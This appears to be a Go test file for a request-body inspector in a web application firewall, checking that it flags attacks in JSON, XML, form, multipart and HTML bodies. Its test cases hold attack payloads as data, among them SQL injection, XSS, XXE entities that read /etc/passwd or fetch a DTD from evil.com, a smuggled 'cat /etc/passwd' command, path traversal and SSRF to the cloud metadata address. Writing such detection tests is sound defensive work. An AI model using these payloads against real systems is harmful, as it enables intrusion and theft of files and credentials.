package inspection

import (
	"bytes"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestBodyInspector_Inspect(t *testing.T) {
	inspector := NewBodyInspector()

	tests := []struct {
		name         string
		contentType  string
		body         string
		wantDetected bool
		wantCategory string
	}{
		// SQL injection in JSON
		{
			name:         "JSON SQLi",
			contentType:  "application/json",
			body:         `{"username": "admin", "password": "' OR '1'='1"}`,
			wantDetected: true,
			wantCategory: "sqli",
		},
		{
			name:         "JSON SQLi UNION",
			contentType:  "application/json",
			body:         `{"query": "1 UNION SELECT * FROM users"}`,
			wantDetected: true,
			wantCategory: "sqli",
		},

		// XSS in JSON
		{
			name:         "JSON XSS script",
			contentType:  "application/json",
			body:         `{"comment": "<script>alert(1)</script>"}`,
			wantDetected: true,
			wantCategory: "xss",
		},
		{
			name:         "JSON XSS event handler",
			contentType:  "application/json",
			body:         `{"bio": "<img onerror='alert(1)' src=x>"}`,
			wantDetected: true,
			wantCategory: "xss",
		},

		// XXE in XML
		{
			name:         "XML XXE entity",
			contentType:  "application/xml",
			body:         `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			wantDetected: true,
			wantCategory: "xxe",
		},
		{
			name:         "XML XXE SYSTEM",
			contentType:  "text/xml",
			body:         `<!DOCTYPE foo [<!ENTITY ext SYSTEM "http://evil.com/evil.dtd">]><foo>&ext;</foo>`,
			wantDetected: true,
			wantCategory: "xxe",
		},

		// Path traversal in form data
		{
			name:         "Form path traversal",
			contentType:  "application/x-www-form-urlencoded",
			body:         "file=../../../etc/passwd",
			wantDetected: true,
			wantCategory: "traversal",
		},

		// Command injection in form data
		{
			name:         "Form command injection",
			contentType:  "application/x-www-form-urlencoded",
			body:         "cmd=test; cat /etc/passwd",
			wantDetected: true,
			wantCategory: "rce",
		},

		// SSRF in form data
		{
			name:         "Form SSRF localhost",
			contentType:  "application/x-www-form-urlencoded",
			body:         "url=http://localhost/admin",
			wantDetected: true,
			wantCategory: "ssrf",
		},
		{
			name:         "Form SSRF metadata",
			contentType:  "application/x-www-form-urlencoded",
			body:         "url=http://169.254.169.254/latest/meta-data/",
			wantDetected: true,
			wantCategory: "ssrf",
		},

		// Clean inputs
		{
			name:         "Clean JSON",
			contentType:  "application/json",
			body:         `{"name": "John Doe", "email": "john@example.com"}`,
			wantDetected: false,
			wantCategory: "",
		},
		{
			name:         "Clean XML",
			contentType:  "application/xml",
			body:         `<?xml version="1.0"?><user><name>John</name></user>`,
			wantDetected: false,
			wantCategory: "",
		},
		{
			name:         "Clean form",
			contentType:  "application/x-www-form-urlencoded",
			body:         "name=John+Doe&email=john%40example.com",
			wantDetected: false,
			wantCategory: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("POST", "http://example.com/api", strings.NewReader(tt.body))
			req.Header.Set("Content-Type", tt.contentType)

			result, err := inspector.Inspect(req)
			if err != nil {
				t.Fatalf("Inspect error: %v", err)
			}

			if result.Detected != tt.wantDetected {
				t.Errorf("Detected = %v, want %v", result.Detected, tt.wantDetected)
			}

			if tt.wantDetected && tt.wantCategory != "" {
				found := false
				for _, f := range result.Findings {
					if f.Category == tt.wantCategory {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("Category %q not found in findings", tt.wantCategory)
				}
			}
		})
	}
}

func TestBodyInspector_DetectContentType(t *testing.T) {
	inspector := NewBodyInspector()

	tests := []struct {
		contentType string
		expected    ContentType
	}{
		{"application/json", ContentTypeJSON},
		{"application/json; charset=utf-8", ContentTypeJSON},
		{"text/json", ContentTypeJSON},
		{"application/xml", ContentTypeXML},
		{"text/xml", ContentTypeXML},
		{"application/x-www-form-urlencoded", ContentTypeFormURLEncoded},
		{"multipart/form-data; boundary=----", ContentTypeMultipart},
		{"text/html", ContentTypeHTML},
		{"text/html; charset=utf-8", ContentTypeHTML},
		{"application/javascript", ContentTypeJavaScript},
		{"text/css", ContentTypeCSS},
		{"text/plain", ContentTypePlainText},
		{"application/octet-stream", ContentTypeUnknown},
		{"", ContentTypeUnknown},
	}

	for _, tt := range tests {
		t.Run(tt.contentType, func(t *testing.T) {
			req := httptest.NewRequest("POST", "http://example.com/", nil)
			req.Header.Set("Content-Type", tt.contentType)

			result, _ := inspector.Inspect(req)
			if result.ContentType != tt.expected {
				t.Errorf("ContentType = %v, want %v", result.ContentType, tt.expected)
			}
		})
	}
}

func TestBodyInspector_MaxBodySize(t *testing.T) {
	inspector := NewBodyInspector()
	inspector.SetMaxBodySize(100)

	// Create a body larger than max size
	largeBody := strings.Repeat("a", 200)
	req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(largeBody))
	req.Header.Set("Content-Type", "text/plain")

	result, err := inspector.Inspect(req)
	if err != nil {
		t.Fatalf("Inspect error: %v", err)
	}

	if result.BodySize > 100 {
		t.Errorf("BodySize = %d, want <= 100", result.BodySize)
	}

	if !result.Truncated {
		t.Error("Expected Truncated = true")
	}
}

func TestBodyInspector_NilBody(t *testing.T) {
	inspector := NewBodyInspector()

	req := httptest.NewRequest("GET", "http://example.com/", nil)
	req.Body = nil

	result, err := inspector.Inspect(req)
	if err != nil {
		t.Fatalf("Inspect error: %v", err)
	}

	if result.Detected {
		t.Error("Should not detect anything with nil body")
	}
}

func TestBodyInspector_EnableDisableContentType(t *testing.T) {
	inspector := NewBodyInspector()

	// Disable JSON inspection
	inspector.DisableContentType(ContentTypeJSON)

	req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(`{"query": "' OR '1'='1"}`))
	req.Header.Set("Content-Type", "application/json")

	result, _ := inspector.Inspect(req)

	// JSON should be skipped
	if result.Detected {
		t.Error("JSON inspection should be disabled")
	}

	// Re-enable
	inspector.EnableContentType(ContentTypeJSON)

	req = httptest.NewRequest("POST", "http://example.com/", strings.NewReader(`{"query": "' OR '1'='1"}`))
	req.Header.Set("Content-Type", "application/json")

	result, _ = inspector.Inspect(req)

	if !result.Detected {
		t.Error("JSON inspection should be re-enabled")
	}
}

func TestBodyInspector_AddPattern(t *testing.T) {
	inspector := NewBodyInspector()

	// Add custom pattern
	err := inspector.AddPattern("custom_test", "BADWORD", 20, "custom", "Custom test pattern")
	if err != nil {
		t.Fatalf("AddPattern error: %v", err)
	}

	req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader("This contains BADWORD"))
	req.Header.Set("Content-Type", "text/plain")

	result, _ := inspector.Inspect(req)

	if !result.Detected {
		t.Error("Custom pattern should be detected")
	}

	found := false
	for _, f := range result.Findings {
		if f.Category == "custom" {
			found = true
			break
		}
	}
	if !found {
		t.Error("Custom category not found in findings")
	}
}

func TestBodyInspector_GetStats(t *testing.T) {
	inspector := NewBodyInspector()

	// Generate some activity
	req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(`{"test": "value"}`))
	req.Header.Set("Content-Type", "application/json")
	inspector.Inspect(req)

	req = httptest.NewRequest("POST", "http://example.com/", strings.NewReader(`{"query": "' OR '1'='1"}`))
	req.Header.Set("Content-Type", "application/json")
	inspector.Inspect(req)

	stats := inspector.GetStats()

	if stats["total_inspections"].(int64) != 2 {
		t.Errorf("total_inspections = %v, want 2", stats["total_inspections"])
	}

	if stats["detections_found"].(int64) != 1 {
		t.Errorf("detections_found = %v, want 1", stats["detections_found"])
	}
}

func TestInspectionResult_Fields(t *testing.T) {
	inspector := NewBodyInspector()

	req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(`{"query": "1 UNION SELECT password FROM users"}`))
	req.Header.Set("Content-Type", "application/json")

	result, _ := inspector.Inspect(req)

	if result.ContentType != ContentTypeJSON {
		t.Errorf("ContentType = %v, want JSON", result.ContentType)
	}

	if result.BodySize == 0 {
		t.Error("BodySize should not be 0")
	}

	if len(result.RawBody) == 0 {
		t.Error("RawBody should not be empty")
	}

	if result.TotalScore == 0 {
		t.Error("TotalScore should not be 0 for detected attack")
	}

	if len(result.Findings) == 0 {
		t.Error("Findings should not be empty")
	}
}

func TestFinding_Fields(t *testing.T) {
	inspector := NewBodyInspector()

	req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(`{"query": "<script>alert(1)</script>"}`))
	req.Header.Set("Content-Type", "application/json")

	result, _ := inspector.Inspect(req)

	if len(result.Findings) == 0 {
		t.Fatal("Expected at least one finding")
	}

	finding := result.Findings[0]

	if finding.Pattern == "" {
		t.Error("Finding.Pattern should not be empty")
	}

	if finding.Match == "" {
		t.Error("Finding.Match should not be empty")
	}

	if finding.Category == "" {
		t.Error("Finding.Category should not be empty")
	}

	if finding.Score == 0 {
		t.Error("Finding.Score should not be 0")
	}
}

func TestContentType_String(t *testing.T) {
	tests := []struct {
		ct       ContentType
		expected string
	}{
		{ContentTypeJSON, "application/json"},
		{ContentTypeXML, "application/xml"},
		{ContentTypeFormURLEncoded, "application/x-www-form-urlencoded"},
		{ContentTypeMultipart, "multipart/form-data"},
		{ContentTypePlainText, "text/plain"},
		{ContentTypeHTML, "text/html"},
		{ContentTypeJavaScript, "application/javascript"},
		{ContentTypeCSS, "text/css"},
		{ContentTypeBinary, "application/octet-stream"},
		{ContentTypeUnknown, "unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.expected, func(t *testing.T) {
			if tt.ct.String() != tt.expected {
				t.Errorf("String() = %q, want %q", tt.ct.String(), tt.expected)
			}
		})
	}
}

func TestExtractJSONValues(t *testing.T) {
	input := []byte(`{"name": "John", "email": "john@example.com", "age": "30"}`)
	values := extractJSONValues(input)

	if values["name"] != "John" {
		t.Errorf("name = %q, want %q", values["name"], "John")
	}

	if values["email"] != "john@example.com" {
		t.Errorf("email = %q, want %q", values["email"], "john@example.com")
	}
}

func TestExtractXMLValues(t *testing.T) {
	input := []byte(`<user><name>John</name><email>john@example.com</email></user>`)
	values := extractXMLValues(input)

	if values["name"] != "John" {
		t.Errorf("name = %q, want %q", values["name"], "John")
	}

	if values["email"] != "john@example.com" {
		t.Errorf("email = %q, want %q", values["email"], "john@example.com")
	}
}

func TestGetContext(t *testing.T) {
	content := []byte("This is some content with a [MATCH] in the middle of the text")
	match := []byte("[MATCH]")

	context := getContext(content, match)

	if !strings.Contains(context, "[MATCH]") {
		t.Error("Context should contain the match")
	}

	if len(context) > len(content) {
		t.Error("Context should not be longer than original content")
	}
}

func TestBodyInspector_FormURLEncoded(t *testing.T) {
	inspector := NewBodyInspector()

	tests := []struct {
		name         string
		body         string
		wantDetected bool
	}{
		{
			name:         "Path traversal",
			body:         "file=..%2F..%2F..%2Fetc%2Fpasswd",
			wantDetected: true,
		},
		{
			name:         "Command injection",
			body:         "cmd=test%3B+cat+%2Fetc%2Fpasswd",
			wantDetected: true,
		},
		{
			name:         "Clean form",
			body:         "username=john&password=secret123",
			wantDetected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(tt.body))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			result, _ := inspector.Inspect(req)

			if result.Detected != tt.wantDetected {
				t.Errorf("Detected = %v, want %v", result.Detected, tt.wantDetected)
			}
		})
	}
}

func TestBodyInspector_Multipart(t *testing.T) {
	inspector := NewBodyInspector()

	boundary := "----WebKitFormBoundary7MA4YWxkTrZu0gW"
	body := `------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"
Content-Type: text/plain

test content
------WebKitFormBoundary7MA4YWxkTrZu0gW--`

	req := httptest.NewRequest("POST", "http://example.com/upload", strings.NewReader(body))
	req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)

	result, _ := inspector.Inspect(req)

	if !result.Detected {
		t.Error("Should detect path traversal in multipart filename")
	}
}

func TestBodyInspector_HTML(t *testing.T) {
	inspector := NewBodyInspector()

	tests := []struct {
		name         string
		body         string
		wantDetected bool
	}{
		{
			name:         "XSS in HTML",
			body:         "<html><body><script>alert(1)</script></body></html>",
			wantDetected: true,
		},
		{
			name:         "Event handler in HTML",
			body:         "<html><body onload='alert(1)'></body></html>",
			wantDetected: true,
		},
		{
			name:         "Clean HTML",
			body:         "<html><body><p>Hello World</p></body></html>",
			wantDetected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(tt.body))
			req.Header.Set("Content-Type", "text/html")

			result, _ := inspector.Inspect(req)

			if result.Detected != tt.wantDetected {
				t.Errorf("Detected = %v, want %v", result.Detected, tt.wantDetected)
			}
		})
	}
}

func TestBodyInspector_BodyRestoration(t *testing.T) {
	inspector := NewBodyInspector()

	originalBody := `{"test": "value"}`
	req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(originalBody))
	req.Header.Set("Content-Type", "application/json")

	// First inspection
	_, _ = inspector.Inspect(req)

	// Body should be restored - read it again
	restoredBody, err := io.ReadAll(req.Body)
	if err != nil {
		t.Fatalf("Error reading restored body: %v", err)
	}

	if string(restoredBody) != originalBody {
		t.Errorf("Restored body = %q, want %q", string(restoredBody), originalBody)
	}
}

func TestPattern_Fields(t *testing.T) {
	pattern := &Pattern{
		Name:        "test_pattern",
		Score:       10,
		Category:    "test",
		Description: "Test description",
	}

	if pattern.Name != "test_pattern" {
		t.Errorf("Name = %q, want %q", pattern.Name, "test_pattern")
	}

	if pattern.Score != 10 {
		t.Errorf("Score = %d, want %d", pattern.Score, 10)
	}
}

func BenchmarkBodyInspector_InspectJSON(b *testing.B) {
	inspector := NewBodyInspector()
	body := `{"username": "admin", "password": "secret123", "query": "SELECT * FROM users"}`

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		inspector.Inspect(req)
	}
}

func BenchmarkBodyInspector_InspectForm(b *testing.B) {
	inspector := NewBodyInspector()
	body := "username=admin&password=secret123&file=document.pdf"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		inspector.Inspect(req)
	}
}

func BenchmarkBodyInspector_InspectLargeBody(b *testing.B) {
	inspector := NewBodyInspector()
	body := strings.Repeat(`{"key": "value", "test": "data"},`, 1000)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("POST", "http://example.com/", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		inspector.Inspect(req)
	}
}

// Helper to create request with body
func createRequestWithBody(method, url, contentType, body string) *http.Request {
	req := httptest.NewRequest(method, url, bytes.NewBufferString(body))
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	return req
}
